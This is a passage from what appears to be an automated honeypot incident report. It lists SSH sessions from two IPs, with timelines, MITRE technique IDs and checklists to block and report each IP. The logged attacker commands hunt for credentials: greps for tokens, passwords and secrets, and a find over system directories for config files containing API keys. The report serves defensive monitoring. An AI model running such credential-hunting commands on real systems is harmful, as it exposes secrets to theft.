| `2026-07-13 12:36:06` | `cowrie.client.version` |
| `2026-07-13 12:36:07` | `cowrie.client.kex` |
| `2026-07-13 12:36:08` | `cowrie.login.success` |
| `2026-07-13 12:36:08` | `cowrie.client.var` |
| `2026-07-13 12:36:08` | `cowrie.client.var` |
| `2026-07-13 12:36:09` | `cowrie.session.params` |
| `2026-07-13 12:36:09` | `cowrie.command.input` |
| `2026-07-13 12:36:09` | `cowrie.log.closed` |
| `2026-07-13 12:36:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a35fddeee21

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'token|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:10` | `cowrie.session.connect` |
| `2026-07-13 12:36:10` | `cowrie.client.version` |
| `2026-07-13 12:36:10` | `cowrie.client.kex` |
| `2026-07-13 12:36:11` | `cowrie.login.success` |
| `2026-07-13 12:36:12` | `cowrie.client.var` |
| `2026-07-13 12:36:12` | `cowrie.client.var` |
| `2026-07-13 12:36:12` | `cowrie.session.params` |
| `2026-07-13 12:36:12` | `cowrie.command.input` |
| `2026-07-13 12:36:12` | `cowrie.log.closed` |
| `2026-07-13 12:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-974444166b2e

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'token|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:13` | `cowrie.session.connect` |
| `2026-07-13 12:36:13` | `cowrie.client.version` |
| `2026-07-13 12:36:13` | `cowrie.client.kex` |
| `2026-07-13 12:36:14` | `cowrie.login.success` |
| `2026-07-13 12:36:15` | `cowrie.client.var` |
| `2026-07-13 12:36:15` | `cowrie.client.var` |
| `2026-07-13 12:36:15` | `cowrie.session.params` |
| `2026-07-13 12:36:15` | `cowrie.command.input` |
| `2026-07-13 12:36:15` | `cowrie.log.closed` |
| `2026-07-13 12:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24422558a84f

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'token|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:16` | `cowrie.session.connect` |
| `2026-07-13 12:36:16` | `cowrie.client.version` |
| `2026-07-13 12:36:16` | `cowrie.client.kex` |
| `2026-07-13 12:36:17` | `cowrie.login.success` |
| `2026-07-13 12:36:18` | `cowrie.client.var` |
| `2026-07-13 12:36:18` | `cowrie.client.var` |
| `2026-07-13 12:36:18` | `cowrie.session.params` |
| `2026-07-13 12:36:18` | `cowrie.command.input` |
| `2026-07-13 12:36:18` | `cowrie.log.closed` |
| `2026-07-13 12:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40f1c0f2fb6b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'token|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:19` | `cowrie.session.connect` |
| `2026-07-13 12:36:19` | `cowrie.client.version` |
| `2026-07-13 12:36:19` | `cowrie.client.kex` |
| `2026-07-13 12:36:20` | `cowrie.login.success` |
| `2026-07-13 12:36:21` | `cowrie.client.var` |
| `2026-07-13 12:36:21` | `cowrie.client.var` |
| `2026-07-13 12:36:21` | `cowrie.session.params` |
| `2026-07-13 12:36:21` | `cowrie.command.input` |
| `2026-07-13 12:36:21` | `cowrie.log.closed` |
| `2026-07-13 12:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7128907b61f2

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'token|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:22` | `cowrie.session.connect` |
| `2026-07-13 12:36:22` | `cowrie.client.version` |
| `2026-07-13 12:36:22` | `cowrie.client.kex` |
| `2026-07-13 12:36:24` | `cowrie.login.success` |
| `2026-07-13 12:36:24` | `cowrie.client.var` |
| `2026-07-13 12:36:24` | `cowrie.client.var` |
| `2026-07-13 12:36:25` | `cowrie.session.params` |
| `2026-07-13 12:36:25` | `cowrie.command.input` |
| `2026-07-13 12:36:25` | `cowrie.log.closed` |
| `2026-07-13 12:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577facead48f

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'api_key' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:25` | `cowrie.session.connect` |
| `2026-07-13 12:36:25` | `cowrie.client.version` |
| `2026-07-13 12:36:25` | `cowrie.client.kex` |
| `2026-07-13 12:36:27` | `cowrie.login.success` |
| `2026-07-13 12:36:27` | `cowrie.client.var` |
| `2026-07-13 12:36:27` | `cowrie.client.var` |
| `2026-07-13 12:36:28` | `cowrie.session.params` |
| `2026-07-13 12:36:28` | `cowrie.command.input` |
| `2026-07-13 12:36:28` | `cowrie.log.closed` |
| `2026-07-13 12:36:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6eaec1b130e

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'api_key|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:28` | `cowrie.session.connect` |
| `2026-07-13 12:36:28` | `cowrie.client.version` |
| `2026-07-13 12:36:29` | `cowrie.client.kex` |
| `2026-07-13 12:36:30` | `cowrie.login.success` |
| `2026-07-13 12:36:31` | `cowrie.client.var` |
| `2026-07-13 12:36:31` | `cowrie.client.var` |
| `2026-07-13 12:36:31` | `cowrie.session.params` |
| `2026-07-13 12:36:31` | `cowrie.command.input` |
| `2026-07-13 12:36:31` | `cowrie.log.closed` |
| `2026-07-13 12:36:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9db77f3c93df

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'api_key|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:32` | `cowrie.session.connect` |
| `2026-07-13 12:36:32` | `cowrie.client.version` |
| `2026-07-13 12:36:32` | `cowrie.client.kex` |
| `2026-07-13 12:36:33` | `cowrie.login.success` |
| `2026-07-13 12:36:34` | `cowrie.client.var` |
| `2026-07-13 12:36:34` | `cowrie.client.var` |
| `2026-07-13 12:36:34` | `cowrie.session.params` |
| `2026-07-13 12:36:34` | `cowrie.command.input` |
| `2026-07-13 12:36:34` | `cowrie.log.closed` |
| `2026-07-13 12:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9484278937bb

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'api_key|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:35` | `cowrie.session.connect` |
| `2026-07-13 12:36:35` | `cowrie.client.version` |
| `2026-07-13 12:36:35` | `cowrie.client.kex` |
| `2026-07-13 12:36:36` | `cowrie.login.success` |
| `2026-07-13 12:36:37` | `cowrie.client.var` |
| `2026-07-13 12:36:37` | `cowrie.client.var` |
| `2026-07-13 12:36:37` | `cowrie.session.params` |
| `2026-07-13 12:36:37` | `cowrie.command.input` |
| `2026-07-13 12:36:37` | `cowrie.log.closed` |
| `2026-07-13 12:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5fdf01a55cb

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'api_key|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:38` | `cowrie.session.connect` |
| `2026-07-13 12:36:38` | `cowrie.client.version` |
| `2026-07-13 12:36:38` | `cowrie.client.kex` |
| `2026-07-13 12:36:40` | `cowrie.login.success` |
| `2026-07-13 12:36:40` | `cowrie.client.var` |
| `2026-07-13 12:36:40` | `cowrie.client.var` |
| `2026-07-13 12:36:41` | `cowrie.session.params` |
| `2026-07-13 12:36:41` | `cowrie.command.input` |
| `2026-07-13 12:36:41` | `cowrie.log.closed` |
| `2026-07-13 12:36:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a432417c7344

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'api_key|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:41` | `cowrie.session.connect` |
| `2026-07-13 12:36:41` | `cowrie.client.version` |
| `2026-07-13 12:36:41` | `cowrie.client.kex` |
| `2026-07-13 12:36:43` | `cowrie.login.success` |
| `2026-07-13 12:36:43` | `cowrie.client.var` |
| `2026-07-13 12:36:43` | `cowrie.client.var` |
| `2026-07-13 12:36:44` | `cowrie.session.params` |
| `2026-07-13 12:36:44` | `cowrie.command.input` |
| `2026-07-13 12:36:44` | `cowrie.log.closed` |
| `2026-07-13 12:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f0f5ce73835

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'api_key|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:44` | `cowrie.session.connect` |
| `2026-07-13 12:36:44` | `cowrie.client.version` |
| `2026-07-13 12:36:45` | `cowrie.client.kex` |
| `2026-07-13 12:36:46` | `cowrie.login.success` |
| `2026-07-13 12:36:46` | `cowrie.client.var` |
| `2026-07-13 12:36:46` | `cowrie.client.var` |
| `2026-07-13 12:36:47` | `cowrie.session.params` |
| `2026-07-13 12:36:47` | `cowrie.command.input` |
| `2026-07-13 12:36:47` | `cowrie.log.closed` |
| `2026-07-13 12:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0da0826e0427

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'api_key|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:48` | `cowrie.session.connect` |
| `2026-07-13 12:36:48` | `cowrie.client.version` |
| `2026-07-13 12:36:48` | `cowrie.client.kex` |
| `2026-07-13 12:36:49` | `cowrie.login.success` |
| `2026-07-13 12:36:50` | `cowrie.client.var` |
| `2026-07-13 12:36:50` | `cowrie.client.var` |
| `2026-07-13 12:36:50` | `cowrie.session.params` |
| `2026-07-13 12:36:50` | `cowrie.command.input` |
| `2026-07-13 12:36:50` | `cowrie.log.closed` |
| `2026-07-13 12:36:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-215a9596ddfa

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'apikey' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:51` | `cowrie.session.connect` |
| `2026-07-13 12:36:51` | `cowrie.client.version` |
| `2026-07-13 12:36:51` | `cowrie.client.kex` |
| `2026-07-13 12:36:52` | `cowrie.login.success` |
| `2026-07-13 12:36:53` | `cowrie.client.var` |
| `2026-07-13 12:36:53` | `cowrie.client.var` |
| `2026-07-13 12:36:53` | `cowrie.session.params` |
| `2026-07-13 12:36:53` | `cowrie.command.input` |
| `2026-07-13 12:36:53` | `cowrie.log.closed` |
| `2026-07-13 12:36:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d74e6e314f2c

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'apikey|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:54` | `cowrie.session.connect` |
| `2026-07-13 12:36:54` | `cowrie.client.version` |
| `2026-07-13 12:36:54` | `cowrie.client.kex` |
| `2026-07-13 12:36:56` | `cowrie.login.success` |
| `2026-07-13 12:36:56` | `cowrie.client.var` |
| `2026-07-13 12:36:56` | `cowrie.client.var` |
| `2026-07-13 12:36:57` | `cowrie.session.params` |
| `2026-07-13 12:36:57` | `cowrie.command.input` |
| `2026-07-13 12:36:57` | `cowrie.log.closed` |
| `2026-07-13 12:36:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b5c67fdffbe

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'apikey|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:57` | `cowrie.session.connect` |
| `2026-07-13 12:36:57` | `cowrie.client.version` |
| `2026-07-13 12:36:58` | `cowrie.client.kex` |
| `2026-07-13 12:36:59` | `cowrie.login.success` |
| `2026-07-13 12:36:59` | `cowrie.client.var` |
| `2026-07-13 12:36:59` | `cowrie.client.var` |
| `2026-07-13 12:37:00` | `cowrie.session.params` |
| `2026-07-13 12:37:00` | `cowrie.command.input` |
| `2026-07-13 12:37:00` | `cowrie.log.closed` |
| `2026-07-13 12:37:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4af3669bb223

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'apikey|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:01` | `cowrie.session.connect` |
| `2026-07-13 12:37:01` | `cowrie.client.version` |
| `2026-07-13 12:37:01` | `cowrie.client.kex` |
| `2026-07-13 12:37:02` | `cowrie.login.success` |
| `2026-07-13 12:37:03` | `cowrie.client.var` |
| `2026-07-13 12:37:03` | `cowrie.client.var` |
| `2026-07-13 12:37:03` | `cowrie.session.params` |
| `2026-07-13 12:37:03` | `cowrie.command.input` |
| `2026-07-13 12:37:03` | `cowrie.log.closed` |
| `2026-07-13 12:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d14ee198974

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'apikey|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:04` | `cowrie.session.connect` |
| `2026-07-13 12:37:04` | `cowrie.client.version` |
| `2026-07-13 12:37:04` | `cowrie.client.kex` |
| `2026-07-13 12:37:05` | `cowrie.login.success` |
| `2026-07-13 12:37:06` | `cowrie.client.var` |
| `2026-07-13 12:37:06` | `cowrie.client.var` |
| `2026-07-13 12:37:06` | `cowrie.session.params` |
| `2026-07-13 12:37:06` | `cowrie.command.input` |
| `2026-07-13 12:37:06` | `cowrie.log.closed` |
| `2026-07-13 12:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1afc6713850a

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'apikey|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:07` | `cowrie.session.connect` |
| `2026-07-13 12:37:07` | `cowrie.client.version` |
| `2026-07-13 12:37:07` | `cowrie.client.kex` |
| `2026-07-13 12:37:08` | `cowrie.login.success` |
| `2026-07-13 12:37:09` | `cowrie.client.var` |
| `2026-07-13 12:37:09` | `cowrie.client.var` |
| `2026-07-13 12:37:09` | `cowrie.session.params` |
| `2026-07-13 12:37:09` | `cowrie.command.input` |
| `2026-07-13 12:37:09` | `cowrie.log.closed` |
| `2026-07-13 12:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6d144533603

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'apikey|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:10` | `cowrie.session.connect` |
| `2026-07-13 12:37:10` | `cowrie.client.version` |
| `2026-07-13 12:37:10` | `cowrie.client.kex` |
| `2026-07-13 12:37:11` | `cowrie.login.success` |
| `2026-07-13 12:37:12` | `cowrie.client.var` |
| `2026-07-13 12:37:12` | `cowrie.client.var` |
| `2026-07-13 12:37:13` | `cowrie.session.params` |
| `2026-07-13 12:37:13` | `cowrie.command.input` |
| `2026-07-13 12:37:13` | `cowrie.log.closed` |
| `2026-07-13 12:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-701547f5dc53

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'apikey|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:13` | `cowrie.session.connect` |
| `2026-07-13 12:37:13` | `cowrie.client.version` |
| `2026-07-13 12:37:13` | `cowrie.client.kex` |
| `2026-07-13 12:37:15` | `cowrie.login.success` |
| `2026-07-13 12:37:15` | `cowrie.client.var` |
| `2026-07-13 12:37:15` | `cowrie.client.var` |
| `2026-07-13 12:37:16` | `cowrie.session.params` |
| `2026-07-13 12:37:16` | `cowrie.command.input` |
| `2026-07-13 12:37:16` | `cowrie.log.closed` |
| `2026-07-13 12:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ac07a41781

| Field | Detail |
|---|---|
| **Source IP** | `222.75.225[.]206` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

